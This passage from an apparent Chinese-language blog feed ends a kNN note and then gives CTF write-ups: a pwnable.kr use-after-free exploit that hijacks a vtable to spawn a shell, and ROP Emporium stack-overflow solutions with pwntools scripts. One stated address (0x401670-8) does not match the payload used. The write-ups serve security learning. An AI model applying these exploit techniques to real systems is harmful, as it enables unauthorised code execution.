href="https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md</a></li></ul><p>注意点在于使用数据前一定要对数据进行归一化，否则数据范围差距过大，会引起很大问题</p><h2><span id="pgui-yi-hua-de-fang-fa">归一化的方法</span><a href="#pgui-yi-hua-de-fang-fa" class="header-anchor">#</a></h2><ul><li>线性函数转换：$y=(x-MinValue)/(MaxValue-MinValue)　　$</li><li>对数函数转换：$y=lg(x)　$ 是非线性转换，对x的取值范围有要求</li><li>反余切函数转换：$y=arctan(x)*2/PI　$，非线性转换，且对x的范围没有要求</li></ul><h2><span id="psan-yao-su">三要素</span><a href="#psan-yao-su" class="header-anchor">#</a></h2><h3><span id="pk-de-qu-zhi">K的取值</span><a href="#pk-de-qu-zhi" class="header-anchor">#</a></h3><ul><li>K小时，近似误差小，估计误差大；K大时，近似误差大，估计误差小</li><li>K小时，相当于用较小邻域中的训练实例进行预测，学习的近似误差会小，只有与输入实例相近的训练集样本才会对结果又影响。但缺点是学习误差会增大，如果恰好有噪声，则可能会出错。因此，K减小容易发生过拟合</li><li>K大时，与上面相反</li><li>可以使用交叉验证选取合适的K值</li></ul><p>PS:</p><ul><li>近似误差：可以理解为对现有训练集的训练误差。</li><li>估计误差：可以理解为对测试集的测试误差。</li></ul><h3><span id="pju-chi-du-liang">距离度量</span><a href="#pju-chi-du-liang" class="header-anchor">#</a></h3><p>通常是用欧氏距离，也可以是曼哈顿距离等</p><h3><span id="pfen-lei-jue-ce">分类决策</span><a href="#pfen-lei-jue-ce" class="header-anchor">#</a></h3><p>少数服从多数</p><h2><span id="phe-xin-suan-fa">核心算法</span><a href="#phe-xin-suan-fa" class="header-anchor">#</a></h2><ul><li>暴力计算（Brute Force）</li><li>二叉树平分参数空间（KD Tree）</li><li>超球体平分训练数据 (Ball Tree)</li></ul><p>具体可以看sklean文档 <a href="https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md" target="_blank" rel="noopener">https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">clf = neighbors.KNeighborsClassifier(k, weights=<span class="string">'uniform'</span>) <span class="comment"># weights选用uniform是所有维度数据权重一致</span></span><br><span class="line">clf.fit(trainingMat, trainLabels)</span><br><span class="line">pridects = clf.predict(testMat)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AI</category>
        <category>machine_learning</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>machine learning</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— uaf</title>
    <url>/23b2d439.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, what is Use After Free bug?</span><br><span class="line"></span><br><span class="line">ssh uaf@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh uaf@pwnable.kr -p2222</code>，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="puaf-cpp">uaf.cpp</span><a href="#puaf-cpp" class="header-anchor">#</a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">	Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(op)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				m-&gt;introduce();</span><br><span class="line">				w-&gt;introduce();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">				data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">				<span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="keyword">delete</span> m;</span><br><span class="line">				<span class="keyword">delete</span> w;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>先把文件下载下来<code>scp -P 2222 -p uaf@pwnable.kr:/home/uaf/* ./</code></p><h3><span id="pshen-qing-kuai-da-xiao">申请块大小</span><a href="#pshen-qing-kuai-da-xiao" class="header-anchor">#</a></h3><p>在main函数中可以看到以下两段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400efb:	bf 18 00 00 00       	mov    $0x18,%edi</span><br><span class="line">400f00:	e8 8b fe ff ff       	callq  400d90 &lt;_Znwm@plt&gt;</span><br><span class="line"></span><br><span class="line">400f59:	bf 18 00 00 00       	mov    $0x18,%edi</span><br><span class="line">400f5e:	e8 2d fe ff ff       	callq  400d90 &lt;_Znwm@plt&gt;</span><br></pre></td></tr></table></figure><p>都是申请了一个Fastbin块用于初始化man和woman对象<br>其中函数_Znwm可以用工具c++filt查看真实的函数名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:&#x2F;ctf&#x2F;work# c++filt _Znwm</span><br><span class="line">operator new(unsigned long)</span><br></pre></td></tr></table></figure><p>由于我们要利用UAF漏洞，所以再次申请时，也需要申请一样大小的Fastbin块，所以在选择2时，我们填入大小为24。由于Fastbin是LIFO，所以我们2申请块时，第一次申请得到的是原先属于w的块，第二次申请得到的是原先属于m的块。</p><h3><span id="pdui-xiang-jie-gou">对象结构</span><a href="#pdui-xiang-jie-gou" class="header-anchor">#</a></h3><p>在while(1)处打断点，然后可以查看到fastbin信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x614e60 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x31,</span><br><span class="line">  fd &#x3D; 0x4,</span><br><span class="line">  bk &#x3D; 0x4,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x6b63614a</span><br><span class="line">&#125;</span><br><span class="line">0x614e90 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x21,</span><br><span class="line">  fd &#x3D; 0x401570 &lt;vtable for Man+16&gt;,</span><br><span class="line">  bk &#x3D; 0x19,</span><br><span class="line">  fd_nextsize &#x3D; 0x614e88,</span><br><span class="line">  bk_nextsize &#x3D; 0x31</span><br><span class="line">&#125;</span><br><span class="line">0x614eb0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x614e88,</span><br><span class="line">  mchunk_size &#x3D; 0x31,</span><br><span class="line">  fd &#x3D; 0x4,</span><br><span class="line">  bk &#x3D; 0x4,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x6c6c694a</span><br><span class="line">&#125;</span><br><span class="line">0x614ee0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x21,</span><br><span class="line">  fd &#x3D; 0x401550 &lt;vtable for Woman+16&gt;,</span><br><span class="line">  bk &#x3D; 0x15,</span><br><span class="line">  fd_nextsize &#x3D; 0x614ed8,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以其中的块0x614e90为例，是m的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10x 0x614e90</span><br><span class="line">0x614e90:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x614ea0:	0x0000000000401570	0x0000000000000019</span><br><span class="line">0x614eb0:	0x0000000000614e88	0x0000000000000031</span><br><span class="line">0x614ec0:	0x0000000000000004	0x0000000000000004</span><br><span class="line">0x614ed0:	0x0000000000000000	0x000000006c6c694a</span><br><span class="line">gdb-peda$ x&#x2F;10a 0x401570</span><br><span class="line">0x401570 &lt;vtable for Man+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x4012d2 &lt;Man::introduce()&gt;</span><br><span class="line">0x401580 &lt;vtable for Human&gt;:	0x0	0x4015f0 &lt;typeinfo for Human&gt;</span><br><span class="line">0x401590 &lt;vtable for Human+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401192 &lt;Human::introduce()&gt;</span><br><span class="line">0x4015a0 &lt;typeinfo name for Woman&gt;:	0x6e616d6f5735	0x0</span><br><span class="line">0x4015b0 &lt;typeinfo for Woman&gt;:	0x602390 &lt;vtable for __cxxabiv1::__si_class_type_info@@CXXABI_1.3+16&gt;	0x4015a0 &lt;typeinfo name for Woman&gt;</span><br><span class="line">gdb-peda$ x&#x2F;s 0x614e88</span><br><span class="line">0x614e88:	&quot;Jack&quot;</span><br></pre></td></tr></table></figure><p>0x401570是Man的虚表，0x19是年龄25岁，0x614e88指向字符串&quot;Jack&quot;<br>也可以查看到w的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10x 0x614ee0</span><br><span class="line">0x614ee0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x614ef0:	0x0000000000401550	0x0000000000000015</span><br><span class="line">0x614f00:	0x0000000000614ed8	0x0000000000000411</span><br><span class="line">0x614f10:	0x0a65657266202e33	0x000000000000000a</span><br><span class="line">0x614f20:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ x&#x2F;10a 0x401550</span><br><span class="line">0x401550 &lt;vtable for Woman+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401376 &lt;Woman::introduce()&gt;</span><br><span class="line">0x401560 &lt;vtable for Man&gt;:	0x0	0x4015d0 &lt;typeinfo for Man&gt;</span><br><span class="line">0x401570 &lt;vtable for Man+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x4012d2 &lt;Man::introduce()&gt;</span><br><span class="line">0x401580 &lt;vtable for Human&gt;:	0x0	0x4015f0 &lt;typeinfo for Human&gt;</span><br><span class="line">0x401590 &lt;vtable for Human+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401192 &lt;Human::introduce()&gt;</span><br><span class="line">gdb-peda$ x&#x2F;s 0x614ed8</span><br><span class="line">0x614ed8:	&quot;Jill&quot;</span><br></pre></td></tr></table></figure><h3><span id="pxu-biao">虚表</span><a href="#pxu-biao" class="header-anchor">#</a></h3><p>当存在虚函数的继承时，会出现虚表vtable，用来索引函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Man:                       0x401570</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+0 | vtable_Man| -----&gt; |+0 give_shell |</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+8 | age       |        |+8 introduce |</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+16| name      |</span><br><span class="line"> ---------------</span><br></pre></td></tr></table></figure><p>本来调用m的introduce函数时，是<code>*(vtable_man+8)</code>，这里<code>vtable_man</code>是我们可以通过文件写入的值，为了调用到<code>give_shell</code>函数，我们只要将文件内容改成<code>(vtable_man-8)</code>的值代替原来的<code>vtable_man</code>即可</p><p>注意到这里有三个虚表，Man的，Woman的以及Human的，任意选一个即可，比如我选<code>(0x401670-8)</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uaf@pwnable:~$ python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt; &#x2F;tmp&#x2F;tmpfile</span><br><span class="line">uaf@pwnable:~$ .&#x2F;uaf 24 &#x2F;tmp&#x2F;tmpfile</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">3</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">1</span><br><span class="line">$ ls</span><br><span class="line">flag  uaf  uaf.cpp</span><br><span class="line">$ cat flag</span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>yay_f1ag_aft3r_pwning</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium (上)</title>
    <url>/ad24c8c9.html</url>
    <content><![CDATA[<p><strong>注意</strong>：64位传参前六个参数使用寄存器RDI、RSI、RDX、RCX、R8、R9</p><a id="more"></a><h2><span id="pret2win">ret2win</span><a href="#pret2win" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><p>先查看一些基本信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ checksec ret2win32 </span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win32/ret2win32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -qs ret2win32 | grep -ve imp -e ' 0 '</span><br><span class="line">0x00002068 1 completed.7200</span><br><span class="line">0x000005f6 99 pwnme</span><br><span class="line">0x00000659 41 ret2win</span><br><span class="line">0x000006f0 2 __libc_csu_fini</span><br><span class="line">0x000004b0 4 __x86.get_pc_thunk.bx</span><br><span class="line">0x00002040 4 stderrGLIBC_2.0</span><br><span class="line">0x0000070c 4 _IO_stdin_used</span><br><span class="line">0x00000690 93 __libc_csu_init</span><br><span class="line">0x00002060 4 stdinGLIBC_2.0</span><br><span class="line">0x00000708 4 _fp_hw</span><br><span class="line">0x00002064 4 stdoutGLIBC_2.0</span><br><span class="line">0x0000057b 123 main</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -z ret2win32 </span><br><span class="line">[strings]</span><br><span class="line">addr=0x08048710 off=0x00000710 ordinal=000 sz=24 section=.rodata string=ret2win by ROP Emporium</span><br><span class="line">addr=0x08048728 off=0x00000728 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x08048731 off=0x00000731 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x0804873c off=0x0000073c ordinal=003 sz=96 section=.rodata string=For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><br><span class="line">addr=0x0804879c off=0x0000079c ordinal=004 sz=30 section=.rodata string=What could possibly go wrong?</span><br><span class="line">addr=0x080487bc off=0x000007bc ordinal=005 sz=100 section=.rodata string=You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!</span><br><span class="line">addr=0x08048821 off=0x00000821 ordinal=006 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048824 off=0x00000824 ordinal=007 sz=29 section=.rodata string=Thank you! Here's your flag:</span><br><span class="line">addr=0x08048841 off=0x00000841 ordinal=008 sz=18 section=.rodata string=/bin/cat flag.txt</span><br></pre></td></tr></table></figure><p>看到有函数<code>pwnme</code>,<code>ret2win</code>,同时也有字符串<code>/bin/cat flag.txt</code>。<br>再用IDA看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ret2win by ROP Emporium"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"32bits\n"</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nExiting"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"</span></span><br><span class="line">    <span class="string">"What could possibly go wrong?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! Here's your flag:"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本很明白了，利用pwnme中的s栈溢出跳转到ret2win部分即可</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">ret_addr = <span class="number">0x8048659</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(ret_addr)</span><br><span class="line">p = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者直接<code>python -c &quot;print 'a'*(0x28+4)+'\x59\x86\x04\x08'&quot; | ./ret2win32</code></p><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win$ checksec ret2win</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win/ret2win'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>和32没什么区别，IDA看下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  puts(&quot;ret2win by ROP Emporium&quot;);</span><br><span class="line">  puts(&quot;64bits\n&quot;);</span><br><span class="line">  pwnme();</span><br><span class="line">  puts(&quot;\nExiting&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">char *pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20uLL);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n&quot;</span><br><span class="line">    &quot;What could possibly go wrong?&quot;);</span><br><span class="line">  puts(&quot;You there madam, may I have your input please? And don&#39;t worry about null bytes, we&#39;re using fgets!\n&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;, 0LL);</span><br><span class="line">  return fgets(&amp;s, 50, stdin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">int ret2win()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Thank you! Here&#39;s your flag:&quot;);</span><br><span class="line">  return system(&quot;&#x2F;bin&#x2F;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有其余参数，所以无差</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">ret_addr = <span class="number">0x400811</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret_addr)</span><br><span class="line">p = process(<span class="string">'./ret2win'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="psplit">split</span><a href="#psplit" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ checksec split32</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/split/split32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split32</span><br><span class="line">[strings]</span><br><span class="line">addr=0x080486f0 off=0x000006f0 ordinal=000 sz=22 section=.rodata string=split by ROP Emporium</span><br><span class="line">addr=0x08048706 off=0x00000706 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x0804870f off=0x0000070f ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x08048718 off=0x00000718 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...</span><br><span class="line">addr=0x08048744 off=0x00000744 ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048747 off=0x00000747 ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line">addr=0x0804a030 off=0x00001030 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt</span><br><span class="line"></span><br><span class="line">7 strings</span><br></pre></td></tr></table></figure><p>IDA看下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span 